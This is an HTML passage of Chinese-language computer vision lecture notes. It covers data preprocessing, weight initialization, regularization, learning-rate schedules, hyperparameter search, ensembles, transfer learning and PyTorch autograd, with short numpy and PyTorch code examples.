<h3 id="note-cs-cv-lec9_10-normalize">normalize<a class="headerlink" href="#note-cs-cv-lec9_10-normalize" title="Permanent link">&para;</a></h3>
<p>对数据进行normalize处理，即除以标准差，可以使得数据更加稳定。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-4.png" width="400" />

<figcaption>
    对数据进行zero-center和normalize处理后的效果。
</figcaption>
</figure>
<p>如果不进行以上两步的处理,首先有可能会出现之字形下降的问题，其次如果说classifier穿过原点，而数据在离原点很远的地方，那么其对于微小变化会非常敏感，从而导致模型不稳定，也难以优化</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-5.png" width="400" />

<figcaption>
    Example
</figcaption>
</figure>
<h3 id="note-cs-cv-lec9_10-pca-and-whitening">PCA and Whitening<a class="headerlink" href="#note-cs-cv-lec9_10-pca-and-whitening" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-6.png" width="400" />

<figcaption>
    PCA and Whitening
</figcaption>
</figure>
<p>PCA（主成分分析）的主要目的是降维，即在保留数据中大部分信息的同时，减少数据的维度。这有助于降低计算复杂度和减少噪声。</p>
<p>PCA通过线性变换将原始数据投影到一个新的坐标系中。这个新坐标系的轴（称为主成分）是数据方差最大的方向。第一个主成分是数据方差最大的方向，第二个主成分是与第一个主成分正交且方差次大的方向，依此类推。</p>
<p>计算数据的协方差矩阵。</p>
<p>计算协方差矩阵的特征值和特征向量。</p>
<p>选择前 <span class="arithmatex">\(k\)</span> 个最大特征值对应的特征向量作为主成分。</p>
<p>将数据投影到这些主成分上。</p>
<p>白化的目的是将数据的特征去相关化，并使每个特征的方差为1。这有助于消除特征之间的线性相关性，使得数据在各个方向上具有相同的尺度。</p>
<p>白化是对PCA的进一步处理。通过对PCA变换后的数据进行缩放，使得每个主成分的方差为1。</p>
<p>首先进行PCA，得到主成分。</p>
<p>对PCA变换后的数据进行缩放，使得每个主成分的方差为1。这通常通过除以每个主成分的标准差来实现。</p>
<h2 id="note-cs-cv-lec9_10-weight-initialization">Weight Initialization<a class="headerlink" href="#note-cs-cv-lec9_10-weight-initialization" title="Permanent link">&para;</a></h2>
<p>对于权重矩阵的初始化也是需要考虑的，如果说权重矩阵初始化为0，那么就无法进行训练，因为所有神经元的输出都是0；常见的初始化是满足高斯分布(正态分布)，的随机初始化</p>
<p><div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-cv-lec9_10-__codelineno-0-1"></a><span class="n">w</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="n">Din</span><span class="p">,</span> <span class="n">Dout</span><span class="p">)</span> <span class="o">*</span> <span class="mf">0.01</span>
</span></code></pre></div>
在numpy中np.random.randn会生成一个均值为0，方差为1的正态分布的随机数。再乘以0.01，可以使得初始的权重矩阵的值比较小,同时标准差(std)变为0.01。</p>
<p>在简单的网络中这表现得还不错，但是在比较大型的网络中就表现得比较差</p>
<p>如果说weight-scale比较小，由于activations(f(weight*input))随着神经网络的加深可能会变的集中在0附近</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-7.png" width="400" />

<figcaption>
    随着神经网络的加深，activations会变得很小。
</figcaption>
</figure>
<p>这将会导致所有的输出都趋近于0，从而导致梯度消失的问题。</p>
<p>可是如果weight-scale比较大，神经网络的激活函数可能会进入饱和状态（saturation）。这是因为大权重会导致输入到激活函数的值变得很大，从而使得激活函数的输出趋于其极限值。(sigmoid or tanh),同样也会导致local stream=0 and no learning。</p>
<h3 id="note-cs-cv-lec9_10-xavier-initialization">Xavier Initialization<a class="headerlink" href="#note-cs-cv-lec9_10-xavier-initialization" title="Permanent link">&para;</a></h3>
<p>究其原因，我们希望恰当的初始化，使得经过一层layer后，output的分布不会发生太大的变化,对于Gaussian distribution，希望和input的std一致.</p>
<p>暂时忽略bias</p>
<div class="arithmatex">\[
    y = W^Tx
\]</div>
<div class="arithmatex">\[
    y_i=\sum_{j=1}^{D_{in}} W_{i,j}x_j
\]</div>
<p>假设<span class="arithmatex">\(W\)</span>和<span class="arithmatex">\(x\)</span>独立，<span class="arithmatex">\(W\)</span>的每个元素也独立同分布，则</p>
<div class="arithmatex">\[
    \operatorname{Var}(y_i) = D_{in} \times \operatorname{Var}(W_{i,j}) \times \operatorname{Var}(x_j) = \operatorname{Var}(x_j)
\]</div>
<p>那么就希望</p>
<div class="arithmatex">\[
    \operatorname{Var}(W_{i,j}) = \frac{1}{D_{in}}
\]</div>
<p>所以在初始化时，所有weight的初始化应该满足</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-cv-lec9_10-__codelineno-1-1"></a><span class="n">w</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="n">Din</span><span class="p">,</span> <span class="n">Dout</span><span class="p">)</span> <span class="o">*</span> <span class="n">np</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="mi">1</span><span class="o">/</span><span class="n">Din</span><span class="p">)</span>
</span></code></pre></div>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-8.png" width="400" />

<figcaption>
    初始化方式对结果的影响
</figcaption>
</figure>
<h3 id="note-cs-cv-lec9_10-he-initialization">He Initialization<a class="headerlink" href="#note-cs-cv-lec9_10-he-initialization" title="Permanent link">&para;</a></h3>
<blockquote>
<p>ReLU</p>
</blockquote>
<p>MSRA初始化，也称为He初始化，是一种用于神经网络权重初始化的方法。它是由何恺明（Kaiming He）及其同事在2015年提出的，专门为ReLU（Rectified Linear Unit）及其变体设计的初始化方法。MSRA初始化的目的是解决深层神经网络中梯度消失和梯度爆炸的问题。</p>
<p>MSRA初始化的基本思想是：为了保持信号在网络的前向传播和反向传播过程中具有适当的方差，权重应该根据输入的数量进行缩放。具体来说，MSRA初始化建议将权重从一个均值为0、方差为 <span class="arithmatex">\(\frac{2}{\text{fan\_in}}\)</span> 的高斯分布中抽取，其中 <span class="arithmatex">\(\text{fan\_in}\)</span> 是输入层的神经元数量。</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-cv-lec9_10-__codelineno-2-1"></a><span class="n">w</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="n">Din</span><span class="p">,</span> <span class="n">Dout</span><span class="p">)</span> <span class="o">*</span> <span class="n">np</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="mi">2</span><span class="o">/</span><span class="n">Din</span><span class="p">)</span>
</span></code></pre></div>
<ul>
<li>
<p><strong>ReLU的特性</strong>: ReLU激活函数在正区域是线性的，而在负区域输出为0。为了确保信号在通过ReLU时不会过于衰减或放大，MSRA初始化选择了 <span class="arithmatex">\(\frac{2}{\text{fan\_in}}\)</span> 作为方差。这是因为ReLU激活函数会使得大约一半的输入为0，因此需要更大的方差来补偿。</p>
</li>
<li>
<p><strong>信号的稳定性</strong>: 通过这种初始化，信号在网络的每一层中保持稳定的方差，从而避免了梯度消失或梯度爆炸的问题。</p>
</li>
</ul>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-9.png" width="400" />

<figcaption>
    ReLU的初始化方式对结果的影响
</figcaption>
</figure>
<h3 id="note-cs-cv-lec9_10-residual-network">Residual Network<a class="headerlink" href="#note-cs-cv-lec9_10-residual-network" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-10.png" width="400" />

<figcaption>
    Residual Network
</figcaption>
</figure>
<p>如果以ReLU为激活函数，以MSRA初始化，那么Var(F(x))=Var(x),Var(F(x)+x)不等于Var(x)，解决方法是第二层权重矩阵直接初始化为0,这样就可以有Var(F(x)+x)=Var(x)。</p>
<h2 id="note-cs-cv-lec9_10-regularization">Regularization<a class="headerlink" href="#note-cs-cv-lec9_10-regularization" title="Permanent link">&para;</a></h2>
<p>除了常见的L1,L2，Elastic Net正则化之外，还有一些其他的方法。</p>
<h3 id="note-cs-cv-lec9_10-dropout">Dropout<a class="headerlink" href="#note-cs-cv-lec9_10-dropout" title="Permanent link">&para;</a></h3>
<p>Dropout 是一种用于防止神经网络过拟合的正则化技术。它通过在训练过程中随机地“丢弃”一部分神经元来实现。这种方法可以有效地减少模型对训练数据的过拟合，从而提高模型的泛化能力。</p>
<ol>
<li>
<p><strong>随机丢弃神经元</strong>: 在每次训练迭代中，Dropout 会以一定的概率 <span class="arithmatex">\( p \)</span> 随机地将一些神经元的输出设置为零。这意味着这些神经元在当前的前向传播和反向传播中被忽略。</p>
</li>
<li>
<p><strong>缩放激活</strong>: 为了保持输出的期望值不变，在训练过程中，未被丢弃的神经元的输出会被缩放（通常是除以 <span class="arithmatex">\( 1-p \)</span>）。这样可以确保在测试时，网络的输出不会因为Dropout而变得不稳定。</p>
</li>
<li>
<p><strong>测试阶段</strong>: 在测试阶段，Dropout 不会丢弃任何神经元，而是使用所有神经元的完整网络结构进行预测。</p>
</li>
</ol>
<h3 id="note-cs-cv-lec9_10-dropconnect">DropConnect<a class="headerlink" href="#note-cs-cv-lec9_10-dropconnect" title="Permanent link">&para;</a></h3>
<p>DropConnect 是一种用于防止神经网络过拟合的正则化方法。与 Dropout 随机丢弃神经元不同，DropConnect 随机丢弃的是权重连接。这意味着在每次训练迭代中，网络的权重矩阵会被随机稀疏化。</p>
<ul>
<li>
<p><strong>工作原理</strong>:</p>
<ul>
<li>在每次训练迭代中，DropConnect 会以一定的概率 <span class="arithmatex">\( p \)</span> 随机地将一些权重设置为零。这意味着这些权重在当前的前向传播和反向传播中被忽略。</li>
<li>这种方法可以看作是对权重矩阵的随机稀疏化，而不是对激活值的稀疏化。</li>
<li>在测试阶段，DropConnect 不会丢弃任何权重，而是使用所有权重的完整网络结构进行预测。</li>
</ul>
</li>
<li>
<p><strong>优点</strong>:</p>
<ul>
<li>DropConnect 可以有效地减少模型对训练数据的过拟合，从而提高模型的泛化能力。</li>
<li>由于它是对权重进行稀疏化，因此可以在某些情况下提供比 Dropout 更好的正则化效果。</li>
</ul>
</li>
<li>
<p><strong>实现</strong>:</p>
</li>
<li>在实现 DropConnect 时，通常会在每次前向传播时生成一个与权重矩阵相同大小的二进制掩码矩阵。这个掩码矩阵决定了哪些权重在当前迭代中被丢弃。</li>
</ul>
<h3 id="note-cs-cv-lec9_10-data-augmentation">Data Augmentation<a class="headerlink" href="#note-cs-cv-lec9_10-data-augmentation" title="Permanent link">&para;</a></h3>
<p>Data Augmentation 是一种用于提高神经网络泛化能力的正则化技术。它通过在训练过程中生成新的训练样本，从而增加训练数据集的多样性。</p>
<ul>
<li>在训练过程中，Data Augmentation 会对原始训练样本进行各种变换，生成新的训练样本。</li>
<li>这些变换可以是图像的旋转、翻转、裁剪、缩放等几何变换，也可以是图像的亮度、对比度、饱和度等颜色变换。</li>
</ul>
<h3 id="note-cs-cv-lec9_10-mixup">Mixup<a class="headerlink" href="#note-cs-cv-lec9_10-mixup" title="Permanent link">&para;</a></h3>
<p>Mixup 是一种用于提高神经网络泛化能力的正则化技术。它通过在训练过程中生成新的训练样本，从而增加训练数据集的多样性。</p>
<p>例如将猫和狗的图片进行mixup，得到新的训练样本。</p>
<hr />
<div align="center">
    <span style="font-size: 24px; font-weight: bold;color:blue">Training dynamics</span>
</div>

<h2 id="note-cs-cv-lec9_10-learning-rate">Learning rate<a class="headerlink" href="#note-cs-cv-lec9_10-learning-rate" title="Permanent link">&para;</a></h2>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-11.png" width="400" />

<figcaption>
    Learning rate
</figcaption>
</figure>
<p>非常大的learning rate会导致模型震荡，甚至不收敛。</p>
<p>高learning rate会导致模型在训练初期就进入饱和状态，从而导致模型无法达到比较低的loss。</p>
<p>低learning rate会导致模型收敛速度变慢，训练时间变长。</p>
<p>好的learning rate应该在训练初期和训练后期都能保持一个比较好的学习速度，并把loss降到最低。</p>
<h3 id="note-cs-cv-lec9_10-step-decay">Step decay<a class="headerlink" href="#note-cs-cv-lec9_10-step-decay" title="Permanent link">&para;</a></h3>
<p>Step decay 是一种用于调整学习率的策略。它在训练过程中定期降低学习率。</p>
<p>ResNet所使用的就是这种策略</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-12.png" width="400" />

<figcaption>
    Step decay
</figcaption>
</figure>
<h3 id="note-cs-cv-lec9_10-cosine-decay">Cosine decay<a class="headerlink" href="#note-cs-cv-lec9_10-cosine-decay" title="Permanent link">&para;</a></h3>
<p>Cosine decay 是一种用于调整学习率的策略。它在训练过程中使用余弦函数来调整学习率。</p>
<div class="arithmatex">\[
    \alpha_t=\alpha_0\frac{1}{2}\left(1+\cos\left(\frac{t}{T}\pi\right)\right)
\]</div>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-13.png" width="400" />

<figcaption>
    Cosine decay
</figcaption>
</figure>
<p>这个会比较好，因为它没有引入额外的超参数，只需要设置一个初始学习率和训练的epoch数。但是这本来就是需要设置的.</p>
<h3 id="note-cs-cv-lec9_10-linear-decay">linear decay<a class="headerlink" href="#note-cs-cv-lec9_10-linear-decay" title="Permanent link">&para;</a></h3>
<p>linear decay 是一种用于调整学习率的策略。它在训练过程中使用线性函数来调整学习率。</p>
<div class="arithmatex">\[
    \alpha_t=\alpha_0(1-\frac{1}{T}t)
\]</div>
<h3 id="note-cs-cv-lec9_10-inverse-sqrt">Inverse sqrt<a class="headerlink" href="#note-cs-cv-lec9_10-inverse-sqrt" title="Permanent link">&para;</a></h3>
<div class="arithmatex">\[
    \alpha_t=\alpha_0\frac{1}{\sqrt{t}}
\]</div>
<h3 id="note-cs-cv-lec9_10-constant">Constant<a class="headerlink" href="#note-cs-cv-lec9_10-constant" title="Permanent link">&para;</a></h3>
<div class="arithmatex">\[
    \alpha_t=\alpha_0
\]</div>
<p>一般而言，不应该在一开始就过分关注学习率；即使使用constant，也会达到比较好的效果。</p>
<h2 id="note-cs-cv-lec9_10-hyperparameter-optimization">Hyperparameter Optimization<a class="headerlink" href="#note-cs-cv-lec9_10-hyperparameter-optimization" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-cv-lec9_10-grid-search">Grid Search<a class="headerlink" href="#note-cs-cv-lec9_10-grid-search" title="Permanent link">&para;</a></h3>
<p>Grid Search 是一种用于超参数优化的方法。它在训练过程中使用网格搜索来调整超参数。</p>
<p>即给定一个超参数的搜索空间，然后在这个空间中进行搜索，找到最优的超参数。</p>
<h3 id="note-cs-cv-lec9_10-random-search">Random Search<a class="headerlink" href="#note-cs-cv-lec9_10-random-search" title="Permanent link">&para;</a></h3>
<p>Random Search 是一种用于超参数优化的方法。它在训练过程中使用随机搜索来调整超参数。</p>
<p>即给定一个超参数的搜索空间，然后在这个空间中进行随机搜索，找到最优的超参数。</p>
<p>一般而言，Random Search 比 Grid Search 效果更好，因为它允许超参数的搜索空间更大，从而找到更优的超参数，有可能某些超参数对于结果的影响并不是很大，而有些超参数对于结果的影响比较大。</p>
<p>例如下面的例子</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec10-1.png" width="400" />

<figcaption>
    Random Search
</figcaption>
</figure>
<p>空间上的点代表超参数的组合，绿色的曲线代表其中一个超参数对于结果的影响，橙色的曲线代表另一个超参数对于结果的影响。可以看到，如果使用Grid Search，那么对于绿色曲线比较难找到比较好的超参数，而如果使用Random Search，那么就可以找到比较好的超参数。，因为它覆盖了更多的情况。</p>
<h3 id="note-cs-cv-lec9_10-steps-when-training">Steps when training<a class="headerlink" href="#note-cs-cv-lec9_10-steps-when-training" title="Permanent link">&para;</a></h3>
<h4 id="note-cs-cv-lec9_10-step1">Step1<a class="headerlink" href="#note-cs-cv-lec9_10-step1" title="Permanent link">&para;</a></h4>
<p><strong>Check initial loss</strong></p>
<p>Turn off weight decay, sanity check loss at initialization</p>
<p>e.g. log(C) for softmax with C classes</p>
<blockquote>
<p>why? 一开始估计每个类别的概率是等可能的，即loss=<span class="arithmatex">\(-log(\frac{1}{C})=log(C)\)</span></p>
</blockquote>
<h4 id="note-cs-cv-lec9_10-step2">Step2<a class="headerlink" href="#note-cs-cv-lec9_10-step2" title="Permanent link">&para;</a></h4>
<p><strong>Overfit a small sample</strong></p>
<p>尝试在一小部分训练数据（大约5-10个小批量）上训练到100%的训练准确率；可以调整网络结构、学习率和权重初始化。关闭正则化。</p>
<ul>
<li>如果损失没有下降，可能是学习率太低或初始化不佳。</li>
<li>如果损失爆炸到无穷大或NaN，可能是学习率太高或初始化不佳。</li>
</ul>
<h4 id="note-cs-cv-lec9_10-step3">Step3<a class="headerlink" href="#note-cs-cv-lec9_10-step3" title="Permanent link">&para;</a></h4>
<p><strong>Find LR that makes loss go down</strong></p>
<p>使用上一步中的网络结构，使用所有训练数据，开启小的权重衰减，找到一个能在大约100次迭代内显著降低损失的学习率。</p>
<h4 id="note-cs-cv-lec9_10-step4">Step4<a class="headerlink" href="#note-cs-cv-lec9_10-step4" title="Permanent link">&para;</a></h4>
<p><strong>Coarse grid, train for ~1-5 epochs</strong></p>
<p>选择几个接近步骤3中有效的学习率和权重衰减值，训练几个模型大约1-5个周期。</p>
<h4 id="note-cs-cv-lec9_10-step5">Step5<a class="headerlink" href="#note-cs-cv-lec9_10-step5" title="Permanent link">&para;</a></h4>
<p><strong>Refine grid, train longer</strong></p>
<p>改进步骤4中有效的学习率和权重衰减值，训练更长的时间。</p>
<h4 id="note-cs-cv-lec9_10-step6">Step6<a class="headerlink" href="#note-cs-cv-lec9_10-step6" title="Permanent link">&para;</a></h4>
<p><strong>Look at learning curves</strong></p>
<p>如果loss一开始很平缓，有可能是初始化没做好；
如果loss一开始下降很快，有可能是学习率太高；Try decay；
如果train_acc的gap比较小，那么欠拟合；
如果val_acc的gap比较大，且train_acc上升但是val_acc下降，那么过拟合；</p>
<h4 id="note-cs-cv-lec9_10-step7">Step7<a class="headerlink" href="#note-cs-cv-lec9_10-step7" title="Permanent link">&para;</a></h4>
<p>Go back to step 5;</p>
<p>确定好大致结构之后就开始调参。</p>
<hr />
<div align="center">
    <span style="font-size: 24px; font-weight: bold;color:blue">After training</span>
</div>

<h2 id="note-cs-cv-lec9_10-model-ensembles">Model ensembles<a class="headerlink" href="#note-cs-cv-lec9_10-model-ensembles" title="Permanent link">&para;</a></h2>
<p>在神经网络中，<strong>模型集成（Model Ensembles）</strong> 是一种提高模型性能和泛化能力的技术。它通过结合多个模型的预测结果来获得更好的整体预测效果。以下是模型集成的关键概念：</p>
<p>模型集成涉及训练多个独立的模型，然后将它们的预测结果进行组合。每个模型可能在不同的数据子集上训练，或者使用不同的初始化和超参数。</p>
<p>通过结合多个模型的预测，集成方法可以减少单个模型的偏差和方差，从而提高整体模型的泛化能力。</p>
<ul>
<li>
<p><strong>优点</strong>:</p>
<ul>
<li><strong>提高准确性</strong>: 通过结合多个模型的预测，集成方法通常能获得比单个模型更高的准确性。</li>
<li><strong>降低过拟合风险</strong>: 由于集成方法结合了多个模型的预测，它们通常比单个模型更不容易过拟合。</li>
</ul>
</li>
<li>
<p><strong>缺点</strong>:</p>
<ul>
<li><strong>计算成本高</strong>: 训练和评估多个模型需要更多的计算资源和时间。</li>
<li><strong>复杂性增加</strong>: 管理和调试多个模型的集成可能会增加系统的复杂性。</li>
</ul>
</li>
</ul>
<p>例如在图像分类中，可以训练多个模型，然后对它们的预测结果进行平均或投票。</p>
<p>比如现在有10个模型，那么最终的预测结果就是这10个模型预测结果的平均值。或者使用投票的方式，选择预测结果最多的那个类别。类似于KNN的思想。</p>
<h2 id="note-cs-cv-lec9_10-transfer-learning">Transfer Learning<a class="headerlink" href="#note-cs-cv-lec9_10-transfer-learning" title="Permanent link">&para;</a></h2>
<p>迁移学习（Transfer Learning）是一种机器学习方法，它利用在一个任务中学到的知识来帮助解决另一个相关任务。迁移学习特别适用于当目标任务的数据有限或难以获取时。</p>
<p>例如在图像分类中，如果目标任务是识别1000个类别，那么可以先使用一个在ImageNet上预训练的模型，然后在这个模型上进行微调。</p>
<ul>
<li>
<p><strong>选择预训练模型</strong>: 首先，选择一个在 ImageNet 上预训练的模型。常用的模型包括 VGG、ResNet、Inception、DenseNet 等。这些模型在 ImageNet 上已经学习到了丰富的特征表示。</p>
</li>
<li>
<p><strong>冻结卷积层</strong>: 通常，预训练模型的前几层（卷积层）会被保留并冻结，因为它们学习到的特征（如边缘、纹理）是通用的，不需要在目标任务中重新训练。</p>
</li>
<li>
<p><strong>替换全连接层</strong>: 最后的全连接层通常与 ImageNet 的 1000 个类别相关。需要将其替换为与目标任务类别数相匹配的新层。</p>
</li>
<li>
<p><strong>微调策略</strong>:</p>
<ul>
<li><strong>冻结大部分层</strong>: 只训练最后几层或新添加的层。这种方法适用于目标任务与 ImageNet 任务相似的情况。</li>
<li><strong>解冻部分层</strong>: 如果目标任务与 ImageNet 任务有较大差异，可以解冻部分卷积层进行微调，以适应新任务的特征。</li>
</ul>
</li>
<li>
<p><strong>选择合适的学习率</strong>: 微调时，通常使用较小的学习率，以避免对预训练权重进行过大的调整。</p>
</li>
<li>
<p><strong>数据增强</strong>: 使用数据增强技术（如旋转、翻转、缩放）来增加数据的多样性，提高模型的泛化能力。</p>
</li>
<li>
<p><strong>数据预处理</strong>: 确保输入图像的尺寸和格式与预训练模型的要求一致（例如，通常需要将图像缩放到 224x224 像素，并进行归一化处理）。</p>
</li>
</ul>
<p>由于模型已经在大规模数据集上预训练，微调所需的时间通常较短。迁移学习可以显著提高目标任务的性能，特别是在数据有限的情况下。过利用预训练模型，目标任务所需的数据量可以显著减少。</p></section><section class="print-page" id="note-cs-cv-lec11_12" heading-number="2.4.5.10"><h1 id="note-cs-cv-lec11_12-software-in-cv-pytorch">Software in CV--PyTorch<a class="headerlink" href="#note-cs-cv-lec11_12-software-in-cv-pytorch" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1404 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 141 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 1 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 7 分钟</p>
</div>
<h2 id="note-cs-cv-lec11_12-autograd">Autograd<a class="headerlink" href="#note-cs-cv-lec11_12-autograd" title="Permanent link">&para;</a></h2>
<p>在 PyTorch 中，<code>autograd</code> 是一个用于自动微分的包，它是 PyTorch 的核心特性之一。<code>autograd</code> 使得神经网络的反向传播变得非常简单，因为它能够自动计算张量的梯度。</p>
<h3 id="note-cs-cv-lec11_12-autograd_1">Autograd 的工作原理<a class="headerlink" href="#note-cs-cv-lec11_12-autograd_1" title="Permanent link">&para;</a></h3>
<ol>
<li>
<p><strong>计算图</strong>: <code>autograd</code> 通过记录张量上的所有操作来构建一个有向无环图（DAG），其中叶子节点是输入张量，根节点是输出张量。每个节点表示一个计算过程。</p>
</li>
<li>
<p><strong>反向传播</strong>: 当调用 <code>.backward()</code> 方法时，<code>autograd</code> 会自动计算损失函数相对于每个叶子节点的梯度。梯度是通过链式法则计算的。</p>
</li>
<li>
<p><strong>梯度存储</strong>: 计算得到的梯度会存储在调用 <code>.backward()</code> 的张量的 <code>.grad</code> 属性中。</p>
</li>
</ol>
<h3 id="note-cs-cv-lec11_12-autograd_2">使用 Autograd<a class="headerlink" href="#note-cs-cv-lec11_12-autograd_2" title="Permanent link">&para;</a></h3>
<p>以下是一个简单的例子，展示了如何使用 <code>autograd</code> 进行自动微分：</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-cv-lec11_12-__codelineno-0-1"></a><span class="kn">import</span> <span class="nn">torch</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-cs-cv-lec11_12-__codelineno-0-2"></a>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-cs-cv-lec11_12-__codelineno-0-3"></a><span class="c1"># 创建一个张量，并设置 requires_grad=True 以便追踪其计算历史</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-cs-cv-lec11_12-__codelineno-0-4"></a><span class="n">x</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">tensor</span><span class="p">([</span><span class="mf">2.0</span><span class="p">,</span> <span class="mf">3.0</span><span class="p">],</span> <span class="n">requires_grad</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-cs-cv-lec11_12-__codelineno-0-5"></a>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-cs-cv-lec11_12-__codelineno-0-6"></a><span class="c1"># 定义一个简单的函数 y = x1^2 + x2^3</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-cs-cv-lec11_12-__codelineno-0-7"></a><span class="n">y</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">**</span><span class="mi">2</span> <span class="o">+</span> <span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">**</span><span class="mi">3</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-cs-cv-lec11_12-__codelineno-0-8"></a>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-cs-cv-lec11_12-__codelineno-0-9"></a><span class="c1"># 反向传播以计算梯度</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-cs-cv-lec11_12-__codelineno-0-10"></a><span class="n">y</span><span class="o">.</span><span class="n">backward</span><span class="p">()</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-cs-cv-lec11_12-__codelineno-0-11"></a>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-cs-cv-lec11_12-__codelineno-0-12"></a><span class="c1"># 输出梯度</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-cs-cv-lec11_12-__codelineno-0-13"></a><span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">grad</span><span class="p">)</span>  <span class="c1"># 输出: tensor([4., 27.])</span>
</span></code></pre></div>
<p>在这个例子中，<code>x</code> 是一个具有两个元素的张量，并且我们希望计算 <code>y</code> 对 <code>x</code> 的梯度。通过调用 <code>y.backward()</code>，<code>autograd</code> 自动计算了 <code>y</code> 对 <code>x</code> 的偏导数，并将结果存储在 <code>x.grad</code> 中。</p>
<ul>
<li>
<p><strong>requires_grad</strong>: 只有设置了 <code>requires_grad=True</code> 的张量会被 <code>autograd</code> 跟踪。默认情况下，所有创建的张量的 <code>requires_grad</code> 属性为 <code>False</code>。</p>
</li>
<li>
<p><strong>梯度累积</strong>: 每次调用 <code>.backward()</code> 时，梯度会累积到 <code>.grad</code> 属性中。因此，在每次反向传播之前，通常需要将梯度清零（<code>x.grad.zero_()</code>）。</p>
</li>
<li>
